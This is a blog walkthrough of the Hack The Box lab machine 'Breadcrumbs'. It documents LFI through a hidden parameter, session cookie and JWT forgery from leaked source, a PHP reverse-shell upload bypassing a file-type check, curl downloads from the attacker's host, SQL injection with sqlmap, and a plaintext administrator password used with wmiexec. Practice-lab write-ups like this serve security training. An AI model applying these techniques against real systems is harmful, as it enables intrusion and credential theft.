---
title:     "Hack The Box - Breadcrumbs"
tags: [HackTheBox,Windows,Hard]
layout: post
categories: HackTheBox-Writeups
---

![](/images/HTB/Breadcrumbs/breadcrumbs.png)

# Introduction
Breadcrumbs is a hard rated Windows machine earning its name because it points you in the correct direction throughout the process. Although there are a lot of steps there is nothing overly complicated and very little time spent wondering what to do next. Overall I found it to be a super fun and satisfying box to complete. Let's get started!

# Initial Enumeration

## Nmap scan
```
# Nmap 7.91 scan initiated Mon Jun  7 16:26:33 2021 as: nmap -T3 -Pn -O -p T:22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sV --script=default,http-vuln-cve2010-0738.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse,msrpc-enum.nse,smb-enum-shares.nse,smb-vuln-ms17-010.nse,smb-enum-users.nse,smb-double-pulsar-backdoor.nse,smb2-vuln-uptime.nse,ssl-cert-intaddr.nse,ssl-dh-params.nse,ssl-heartbleed.nse,mysql-audit.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse -oN /storage/HackTheBox/Breadcrumbs/nmap/vuln_10.10.10.228.nmap 10.10.10.228
Nmap scan report for breadcrumbs.htb (10.10.10.228)
Host is up (0.033s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.16' is not allowed to connect to this MariaDB server
|_mysql-empty-password: Host '10.10.14.16' is not allowed to connect to this MariaDB server
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=6/7%Time=60BE80FA%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.16'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (94%), Microsoft Windows Longhorn (94%), Microsoft Windows 10 1703 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 8 (92%), Microsoft Windows Server 2008 R2 (92%), Microsoft Windows 7 SP1 (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows 10 1511 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5m02s
|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-07T20:34:25
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  7 16:29:35 2021 -- 1 IP address (1 host up) scanned in 181.55 seconds
```

## HTTP
We see that we have both HTTP and HTTPS available. Looking at both they appear to be the same page and the SSL certificate does not offer us any information. Continuing to look at the site we find that we only have a link to check books. We can enter an 'a' into the title field and get some results however there isn't much more we can do. We do have a link to helich0pper's GitHub page and poking around that immediately threw off some red flags for what may be coming, but we'll get to that later.

## Exploring the portal
Since there isn't much more we can do on this site I figured a Gobuster would be the next step. Gobuster does quickly find a bunch of directory's, the most interesting being `/portal`. We find a login page with a link to `https://10.10.10.228/portal/php/admins.php` which has a list of names of helpers (although the link is admins.php so perhaps admins?) so we have some possible usernames here. 

We are also given the ability to create a login so let's do that next and see where we get. After creating a user account we are now able to log in with that account and we find ourselves at a dashboard with a few options. The first link `check tasks` has something interesting listed at #3.

![](/images/HTB/Breadcrumbs/tasks.png)

Task #3 is listed as `Fix PHPSESSID infinite session duration` which sounds like something we could exploit. At this point I decided to fire up Burp Suite to start gathering website information since the breadcrumbs seem to be pointing us in the direction of exploiting something on the web. At the very least I could take a look at this PHPSESSID cookie when I was done.

The next link on the dashboard is `order pizza` which is disabled for economical reasons so that wont be much help. Next we have a user management section which shows us the same admins as we saw previously plus a few more accounts including our account. 

![](/images/HTB/Breadcrumbs/users.png)

Finally we have a file management link which despite the fact that it is linking us to another PHP file it brings us back to the dashboard.

# Starting the exploit process

## Revisiting books.php
Since we now have Burp Suite running let's have another look at the request we are making when searching for books on the original site.

![](/images/HTB/Breadcrumbs/book_request.png)

There is something that sticks out with our request. We can expect the author and title parameters since that is what we are putting into the site, but what is this third parameter `method` and why is it set to '0'? What happens if we change it to a '1'?

![](/images/HTB/Breadcrumbs/method1.png)

We get some very interesting information back with this request. First we see that there is an undefined key of 'book', and second we see that `file_get_contents` is being used. When submitting the post request we are actually submitting values that match up to keys. As an example from this page, `title` would be a key and we are submitting `test` as the value. Likewise `author` is a key and again `test` is the value. What this warning is telling us is that there is another key that is not being used in our request. If we add `&book=` to the end of our request we no longer get the warning of an undefined key.

Now that we know there is another key what can we do with it? Well the second warning is `file_get_contents(../books/)` failing to open a file. Since the new key we are adding is called `book` it makes sense that if we were to point the key `book` to a file on the server that it would try to get the file contents for us. If we go back to our Gobuster scan we see that `/books/` indeed exists. If we navigate to that folder we see a bunch of HTML files. Let's see what happens if we set the key book to one of these filenames.

![](/images/HTB/Breadcrumbs/lfi_book.png)

So we can read files now, excellent! Can we read any file we want?

![](/images/HTB/Breadcrumbs/lfi_index.png)

Well it certainly looks like we can.

## LFI fun

### Side note on cleaning up files
When we request these files they are full of character escapes and new line characters. We can use Sublime Text to clean these up with find/replace and regular expressions. Below is a table of items to replace to return the files to normal.

| Find 		| Replace |
|:---:		| :---:	  |
|`\\r\\n` 	| `\n` 	  |
|`\\"` 		| `"`	  |
|`\\/` 		| `/`	  |


![](/images/HTB/Breadcrumbs/subl_expressions.png)

Now that we have LFI we can start reading any file we want. If we keep poking around we will eventually find the next breadcrumb. Remember that file management link in the portal that seemingly did nothing? Let's take a look at it and find out why by pulling `files.php` with our LFI.

![](/images/HTB/Breadcrumbs/filesphp.png)

Right at the top of this file we see that it is checking to see if we are the user `Paul` and if we are not we load index.php. So we now have a goal, become Paul. If we think back to the tasks page and the problem of PHPSESSID having an infinite duration it seems like if we can get Paul's cookie we should be able to login as him. Since we can read any file we want let's see if we can figure out how this cookie is generated. The cool thing is we can just follow the files that are called in each php script. For example files.php looks in /auth/login.php (which ends up not being in the /auth/ directory but in the portal directory), login.php calls 'authController.php', and authController calls 'cookie.php'.

### Cookies
Cookie.php is a pretty simple file.

![](/images/HTB/Breadcrumbs/cookiephp.png)

We see that this is passed a username, some magic happens, and a session_cookie is returned. Since we have the script that generates these cookies, let's put it to work! We can save the script and make a few modifications to it. For one we don't need it to be a function, we can pass it a username directly. Second since it is no longer a function we can just echo out the session cookie instead. The code I ended up with is the following:

```
<?php
$username = 'cypher';
$max = strlen($username) - 1;
$seed = rand(0, $max);
$key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
$session_cookie = $username.md5($key);
echo $session_cookie;
```
Now we can save this as test.php and run it with `php test.php` and see what the output is.

![](/images/HTB/Breadcrumbs/testcookie.png)

Welp, the script works, but if we compare the output to one of our previous images where we have our PHPSESSID (cyphera2a6a014d3bee04d7df8d5837d62e8c5) it doesn't match. That is because if we look at the 'magic' in the cookie.php file we see that there is a random element based on the length of our username. Let's do a quick loop and let this script run for a few seconds, then sort the output for unique strings. `while true; do php test.php >> cookies.txt; done` and `sort -u cookies.txt`

![](/images/HTB/Breadcrumbs/testcookies.png)

Success! Of the 584 cookies we have just generated, six of them are unique and one of them matches our current cookie of `cyphera2a6a014d3bee04d7df8d5837d62e8c5` so we know we are generating them properly. Now all we need to do is replace the username with `paul` and repeat the process.

![](/images/HTB/Breadcrumbs/paulcookie.png)

We only get four cookies this time since 'paul' is only four characters long. Now all we need to do is go back to FireFox and replace our current cookie with these until we get logged in as Paul. F12 brings up the developer tools, and under the storage tab we can see our cookies and replace the PHPSESSID with the ones we just generated, one by one. Once we have it replaced we can refresh `https://10.10.10.228/portal/` to see if we are logged in as Paul.

![](/images/HTB/Breadcrumbs/paullogin.png)

It looks like the first cookie (`paul47200b180ccd6835d25d034eeb6e6390`) is the winner! While we still cant order a pizza we do now have access to the file management page. The file management page contains a form to type in a completed task and asks us to upload a zip file. We're not going to get a shell back with a zip, but let's just see what happens when we upload one.

![](/images/HTB/Breadcrumbs/failed_upload.png)

Insufficient privileges? That doesn't seem right. Let's dig into what is going on.

### JSON web tokens
We see in burp that our upload is actually making a post request to `/includes/bookController.php`, so let's use our LFI to pull that file and see what it contains.

![](/images/HTB/Breadcrumbs/filecontroller.png)

Ahh. So fileController is trying to validate that other cookie we have named `token`. We see in this file references to `JWT` and searching for that in Google leads us to JSON web tokens. You can find a nice explanation of JWT on jwt.io (link in references) and they even have a tool to decode them. The gist of it is that these tokens are made up of three parts, the header, the payload, and the signature. The header and payload are just base64 and can be decoded, but the signature is a combination of the header and payload signed with a secret key. If we were to just change the username in the payload to 'paul' for our example here the signature would no longer match. Thankfully since we have access to fileController.php we can see the secret key used to sign these tokens and create one for the user paul.

If we take the first two sections (which are the header and the payload separated by a period) of our current cookie `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiY3lwaGVyIn19` and paste them into jwt.io we see that it is decoded. Now if we take the secret key from fileController.php and paste it into the field for entering the key we should end up with our original JWT.

![](/images/HTB/Breadcrumbs/jwt.png)

Perfect! At this point generating a token for paul is as simple as editing the username from 'cypher' to 'paul'. Doing that gives us the new JWT of:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```
We can edit the 'token' cookie the same way we changed our PHPSESSID and retry the upload.

![](/images/HTB/Breadcrumbs/good_upload.png)

Looking good! Now let's see if we can get a shell from here...

# Getting User

The task submission form asks us nicely to only upload zip files, but I don't think we'll listen =). We know this site is running PHP, however the standard php-reverse-shell from pentestmonkey does not work with Windows out of the box. After a quick Google search I came across the GitHub page of Ivan Šincek (link in the references section) who has a nice PHP reverse shell that works with Windows and Linux. A quick edit to the file to put our IP and port in and we are good to go. We'll set taskname to shell and upload our shell.php file, however upon browsing to `https://10.10.10.228/portal/uploads/` (the uploads directory per fileController.php) we see a file shell.zip. Let's go back to our friend Burp Suite.

Looking at our upload request everything seems to be in order, however if we scroll to the bottom of the request we see a section starting with 'Content-Disposition'. 

![](/images/HTB/Breadcrumbs/content_disposition.png)

Sure enough at the bottom of this section our file is being renamed to shell.zip. Let's fix that and change it back to shell.php and send the request.

![](/images/HTB/Breadcrumbs/shell_upload.png)

Much better. All that's left is to start our listener and open shell.php.

![](/images/HTB/Breadcrumbs/wwwdata.png)

Phew. We finally have a shell on the box.

## Juliette
Sadly we are the www-data user so we don't have a flag yet, but a `dir c:\users` shows us we should either be looking for the development account or the Juliette account. Thankfully we don't have to look far. If we move up one directory from the `/uploads` directory we dropped in at, we come across a directory named `pizzaDeliveryUserData`.

![](/images/HTB/Breadcrumbs/pizza.png)

In this directory we can see that all of the files are the exact same size except Juilette's. Let's have a look at this file.

![](/images/HTB/Breadcrumbs/juliette.png)

Awesome. Looks like we have some credentials, and as it turns out those will work for SSH. Once we are SSH'd into the box as Juilette we can grab the user flag. Also on her desktop we see a todo.html file. Let's take a look.

![](/images/HTB/Breadcrumbs/todo.png)

The box gives us another breadcrumb here by telling us that there are passwords stored in the Microsoft Store Sticky Notes application. Remember when we were just starting and I mentioned helich0pper's GitHub page having some red flags? This would be red flag #1. helich0pper actually has a repo called `StickySituation` which is an application to extract the notes from sticky notes. Unfortunately we need to compile this ourselves. For me, I only have Visual Studio Build Tools installed, so I was able to accomplish this from the command line by navigating to `C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin>` and running the command `msbuild.exe c:\Users\Cypher\Downloads\StickySituation-master\StickySituation.sln`. Once compiled we find the executable in `StickySituation-master\x64\Debug` directory.

Now that we have it compiled we need to get it onto the breadcrumbs machine. Since cURL was added to Windows we can use that to grab the file from ourself. We can start a webserver with `python3 -m http.server 80` on our kali machine and grab it by using `curl 10.10.14.5/StickySituation.exe -o StickySituation.exe` on breadcrumbs, making sure we are in a directory we have permission to write to. After it is transferred we can run it with `.\StickySituation.exe`.

![](/images/HTB/Breadcrumbs/sticky.png)

We don't get the administrator account however we do get credentials to the development account. Those credentials also work for SSH so let's see what we can do with our new account.

## Development
With some basic enumeration we would have stumbled upon the 'Development' folder in the root of `C:\` which we now have access to. Inside of this directory we have a file called `Krypter_Linux` which seems like an odd thing to find on a Windows box. Obviously since we have been pointed to this file we want to examine it further. We can use certutil to base64 encode the file and decode it back on our kali machine. We can do that with `certutil -encode Krypter_Linux c:\Users\development\AppData\b64` We can `type b64` and copy the contents, excluding the begin/end certificate line. Back on our kali machine we can paste the b64 data into a file and recreate the original file using `cat krypter.b64 | base64 -d > krypter_linux`.

Now that we have the file we can examine it further. Running a `file krypter_linux` shows us that this is ELF executable. We could run it but lets check it with `strings` first. 

![](/images/HTB/Breadcrumbs/krypter.png)

So it looks like this was a program created by Juliette which pulls passwords from a cloud password manager. What's nice is we can even see the request that is being made to accomplish this, the request being a post to `http://passmanager.htb:1234/index.php` with the parameters `method=select&username=administrator&table=passwords`. We don't know what `http://passmanager.htb` might be, but let's check what is listening on this box with netstat.

![](/images/HTB/Breadcrumbs/nstat.png)

So it looks like 127.0.0.1 is listening on port 1234. What happens if we try to do the request that krypter_linux is making manually? We already know we have cURL so let's give it a shot with `curl -d "method=select&username=administrator&table=passwords" http://127.0.0.1:1234/index.php`.

![](/images/HTB/Breadcrumbs/passmanager_curl.png)

Excellent! Maybe. Why do we have an AES key and not the Administrator password? Looking back at the strings for krypter_linux we see that in the next update we can expect "Get password from cloud and AUTOMATICALLY decrypt!". Presumably the administrator password is in this database somewhere and we have only pulled out the key to decrypt it. My next thought was to try to modify the request to see if we could find another table name. After changing the table name to something else we get an interesting error.

![](/images/HTB/Breadcrumbs/mysqli_error.png)

So we now know this is doing some sort of SQL query to pull out the data. Perhaps that means it is vulnerable to some SQL injection. I tried this manually for a bit and didn't get anywhere so I figured I would let sqlmap have a go at it. We can accomplish this by forwarding port 1234 to our own box so it looks like we are running the server locally. While on breadcrumbs, on a new line `~C -L 1234:127.0.0.1:1234` will forward port 1234 to our machine over the SSH connection. Now when we do the curl command on our kali machine we can access the remote server.


![](/images/HTB/Breadcrumbs/ssh_forward.png)

With the port forward setup we can now run sqlmap and point it at ourselves to have it test the remote server. To accomplish this we can put the the following in a file called passmanager.req

```
POST /index.php HTTP/1.1
Host: 127.0.0.1:1234
Content-Length: 52
Content-Type: application/x-www-form-urlencoded

method=select&username=administrator&table=passwords
```

Now all we have to do is give this to sqlmap and let it run with `sqlmap -r passmanager.req`. Sure enough we find that this is vulnerable to SQL injection. 

![](/images/HTB/Breadcrumbs/sql_injection.png)

We can now dump the list of table names with `sqlmap -r passmanager.req --tables`. We find that there is a database `bread` with one table being `passwords`. Let's dump what is in that database with `sqlmap -r passmanager.req -D bread --dump-all`.

![](/images/HTB/Breadcrumbs/db_dump.png)

Awesome, we finally have our administrator password.

# Getting Administrator 
Now that we have the encrypted password as well as the key we can decrypt it. We don't have to look around for long to find a tool to do this. Using the tool on devglan (link in the references section) we can enter the password as the text to be decrypted and leave it marked as base64. If we enter the key and click decrypt we get an error, however if we change the mode to CBC we are given some base64 output. If we click decode to plain text we are given our password.

![](/images/HTB/Breadcrumbs/aes_decrypt.png)

It is also worth noting that helich0pper has another tool on his GitHub page which can decrypt this for us. Feel free to have a look at Karkinos which will do that and more.

Now we can use psexec.py to open a shell, or at least we can try to. It seems to hang and fail so instead we can use wmiexec.py for a semi interactive shell by running the command `python3 wmiexec.py breadcrumbs/administrator:'p@ssw0rd!@#$9890./'@10.10.10.228`.

![](/images/HTB/Breadcrumbs/root.png)

Boom.

# References 

- [JSON Web Token Introduction - jwt.io](https://jwt.io/introduction)
- [GitHub - ivan-sincek/php-reverse-shell: PHP reverse shell script. Works on Linux OS, macOS, and Windows OS.](https://github.com/ivan-sincek/php-reverse-shell)
- [helich0pper · GitHub](https://github.com/helich0pper)
- [Online Tool for AES Encryption and Decryption](https://www.devglan.com/online-tools/aes-encryption-decryption)